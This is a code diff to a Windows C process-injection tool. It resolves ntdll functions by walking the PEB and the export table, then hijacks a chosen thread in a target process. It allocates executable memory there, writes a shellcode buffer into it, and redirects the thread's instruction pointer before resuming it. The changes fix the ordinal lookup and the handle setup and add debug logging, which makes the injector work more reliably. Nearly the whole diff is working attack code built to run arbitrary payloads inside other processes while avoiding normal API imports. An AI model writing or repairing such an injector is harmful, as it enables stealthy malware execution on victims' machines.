@@ -10,7 +10,7 @@
 #define TH32CS_SNAPPROCESS 0x00000002
 #define TH32CS_SNAPTHREAD
 
-#define CREATE_NO_WINDOW 0x08000000
+// CREATE_NO_WINDOW already defined in winbase.h
 
 //#define PAGE_READWRITE 0x04
 //#define MEM_COMMIT 0x00001000
@@ -79,10 +79,10 @@ unsigned char buf[] =
 
 
 
-size_t GetModHandle(wchar_t *ln) {
+size_t GetModHandle(wchar_t* ln) {
 	PEB* pPeb = (PEB*)__readgsqword(0x60);
 	PLIST_ENTRY header = &(pPeb->Ldr->InMemoryOrderModuleList);
-	i("%p\n",pPeb);
+	i("%p\n", pPeb);
 	i("%p\n", header);
 
 
@@ -94,12 +94,12 @@ size_t GetModHandle(wchar_t *ln) {
 		i("current node is: %ls\n", data->FullDllName.Buffer);
 
 		if (StrStrIW(ln, data->FullDllName.Buffer)) {
-			e("%ls is a match to %ls.", data->FullDllName.Buffer,ln);
+			e("%ls is a match to %ls.", data->FullDllName.Buffer, ln);
 
-			return data->DllBase;
+			return (size_t)data->DllBase;
 		}
 		else {
-			e("%ls is not a match to %ls\n" , data->FullDllName.Buffer,ln);
+			e("%ls is not a match to %ls\n", data->FullDllName.Buffer, ln);
 		}
 
 
@@ -119,17 +119,20 @@ size_t GetFuncAddr(size_t modb, char* fn) {
 	PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(modb + data_Dir.VirtualAddress);
 
 	i("Export Table: %p\n", exportTable);
-	DWORD* arrf = (DWORD *)(modb + exportTable->AddressOfFunctions);
+	DWORD* arrf = (DWORD*)(modb + exportTable->AddressOfFunctions);
 	DWORD* arrn = (DWORD*)(modb + exportTable->AddressOfNames);
-	DWORD* arrno = (DWORD*)(modb + exportTable->AddressOfNameOrdinals);
+	WORD* arrno = (WORD*)(modb + exportTable->AddressOfNameOrdinals);
 
 	for (size_t i = 0; i < exportTable->NumberOfNames; i++) {
 		char* name = (char*)(modb + arrn[i]);
-		WORD numCAPIO = arrno[i] + 1;
-		if (!stricmp(name, fn)) {
-			g("Found ordinal %.4x - %s\n",numCAPIO, name);
-			return modb + arrf[numCAPIO - 1];
 
+		WORD ordinalIndex = arrno[i];
+		i("Checking function: %s (ordinal index: %d)", name, ordinalIndex);
+		if (!stricmp(name, fn)) {
+			g("Found function %s at ordinal index %d", name, ordinalIndex);
+			size_t funcAddr = modb + arrf[ordinalIndex];
+			g("Function address: 0x%p", funcAddr);
+			return funcAddr;
 		}
 
 	}
@@ -149,12 +152,18 @@ size_t GetFuncAddr(size_t modb, char* fn) {
 
 int main(int argc, char* argv[]) {
 
+	if (argc < 3) {
+		e("Usage: %s <pid> <tid>", argv[0]);
+		return 1;
+	}
+
 	int pid = atoi(argv[1]);
-	DWORD procid = (DWORD)pid;
 	int tid = atoi(argv[2]);
-	DWORD thid = (DWORD)tid;
+	DWORD procid = (DWORD)pid;
+	DWORD threadid = (DWORD)tid;
+
 	size_t kb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");
-	
+
 	//ze_t mb = GetModHandle(L"C:\\WINDOWS\\System32\\kernel32.dll");
 
 	//size_t ptr_CreateProcessW = (size_t)GetFuncAddr(mb, "CreateProcessW");
@@ -164,57 +173,65 @@ int main(int argc, char* argv[]) {
 	//size_t ptr_CloseHandle = (size_t)GetFuncAddr(mb, "CloseHandle");
 
 
-	size_t ptr_NtOpenThread = (size_t)GetFuncAddr(kb,"NtOpenThread");
+	size_t ptr_NtOpenThread = (size_t)GetFuncAddr(kb, "NtOpenThread");
 	size_t ptr_NtOpenProcess = (size_t)GetFuncAddr(kb, "NtOpenProcess");
-	size_t ptr_NtSuspendThread = (size_t)GetFuncAddr(kb,"NtSuspendThread");
-	size_t ptr_NtGetContextThread = (size_t)GetFuncAddr(kb,"NtGetContextThread");
-	size_t ptr_NtAllocateVirtualMemory = (size_t)GetFuncAddr(kb,"NtAllocateVirtualMemory");
-	size_t ptr_NtWriteVirtualMemory = (size_t)GetFuncAddr(kb,"NtWriteVirtualMemory");
+	size_t ptr_NtSuspendThread = (size_t)GetFuncAddr(kb, "NtSuspendThread");
+	size_t ptr_NtGetContextThread = (size_t)GetFuncAddr(kb, "NtGetContextThread");
+	size_t ptr_NtAllocateVirtualMemory = (size_t)GetFuncAddr(kb, "NtAllocateVirtualMemory");
+	size_t ptr_NtWriteVirtualMemory = (size_t)GetFuncAddr(kb, "NtWriteVirtualMemory");
 	size_t ptr_NtSetContextThread = (size_t)GetFuncAddr(kb, "NtSetContextThread");
 	size_t ptr_NtResumeThread = (size_t)GetFuncAddr(kb, "NtResumeThread");
+
+	i("Resolved function addresses:");
+	i("NtOpenThread: 0x%p", ptr_NtOpenThread);
+	i("NtOpenProcess: 0x%p", ptr_NtOpenProcess);
+	i("NtSuspendThread: 0x%p", ptr_NtSuspendThread);
 
 
 
 	NTSTATUS status;
 
 	STARTUPINFOW si = { .cb = sizeof(STARTUPINFOW) };
-	CLIENT_ID cid = { (HANDLE)procid, (HANDLE)thid };
+	CLIENT_ID cid_proc = { (HANDLE)(ULONG_PTR)procid, NULL };
+	CLIENT_ID cid_thread = { (HANDLE)(ULONG_PTR)procid, (HANDLE)(ULONG_PTR)threadid };
+	i("target pid: %d, tid: %d", procid, threadid);
+	i("pid read in: %d", cid_proc.UniqueProcess);
 
-	i("target pid: %d", procid);
-	i("CLIENT_ID: %p, %p", cid.UniqueProcess, cid.UniqueThread);
+	OBJECT_ATTRIBUTES oa;
+	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
 
-	OBJECT_ATTRIBUTES oa = { 0 };
-	oa.Length = sizeof(OBJECT_ATTRIBUTES);
-	
-	
+
+
+
 	PVOID baseAddress = NULL;
 	PROCESS_INFORMATION pi;
 	CONTEXT CTX = { .ContextFlags = (CONTEXT_CONTROL | CONTEXT_SEGMENTS | CONTEXT_INTEGER) };
-	
-	
-	
 
-	//BOOL proc = ((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))ptr_CreateProcessW)(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);	
-	
-	
 
-	
+
+
+	//BOOL proc = ((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))ptr_CreateProcessW)(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+
+
+
+
 	SIZE_T sz = sizeof(buf);
 	g("size of shellcode: %d", sz);
 
 	HANDLE hProc;
 	HANDLE hThread;
 
-	
-	
-	status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))ptr_NtOpenProcess)(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);
+	i("NtOpenProcess at: 0x%p", ptr_NtOpenProcess);
+	i("passing in:\n - handle:0x%x\n - mask: 0x%x\n - object attributes: 0x%p\n - cid: 0x%p\n", &hProc, PROCESS_ALL_ACCESS, &oa, &cid_proc);
+
+	status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))ptr_NtOpenProcess)(&hProc, PROCESS_ALL_ACCESS, &oa, &cid_proc);
 
 	if (status == STATUS_SUCCESS) { g("proc opened"); }
 	else { e("proc not open, 0x%08X", status); return 1; }
 
 
-	status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))ptr_NtOpenThread)(&hThread, THREAD_ALL_ACCESS, &oa , &cid);
-	
+	status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))ptr_NtOpenThread)(&hThread, THREAD_ALL_ACCESS, &oa, &cid_thread);
+
 	if (status == STATUS_SUCCESS) { g("thread opened"); }
 	else { e("thread not open, 0x%08X", status); return 1; }
 
@@ -229,15 +246,16 @@ int main(int argc, char* argv[]) {
 	else { e("did not get ctx thread, 0x%08X", status); return 1; }
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hProc, &baseAddress, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	
-	if (status == STATUS_SUCCESS){ g("allocated memory at: %p", baseAddress); }
-		else { e("failed to allocate memory, 0x%08X", status); return 1; }
-		
+
+	if (status == STATUS_SUCCESS) { g("allocated memory at: %p", baseAddress); }
+	else { e("failed to allocate memory, 0x%08X", status); return 1; }
+
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hProc, baseAddress, buf, sizeof(buf), NULL);
-	if (status == STATUS_SUCCESS) { g("wrote memory, 0x%08X", status);
+	if (status == STATUS_SUCCESS) {
+		g("wrote memory at: %p", baseAddress);
 	}
-	else { e("did not write, %08X", status);; return 1; }
+	else { e("did not write, %08X", status); return 1; }
 
 	CTX.Rip = (DWORD64)baseAddress;
 
@@ -246,6 +264,7 @@ int main(int argc, char* argv[]) {
 	else { e("did not set , 0x%08X", status); return 1; }
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtResumeThread)(hThread, NULL);
+
 	if (status == STATUS_SUCCESS) { g("resumed"); }
 	else { e("did not resume, 0x%08X", status); return 1; }
 
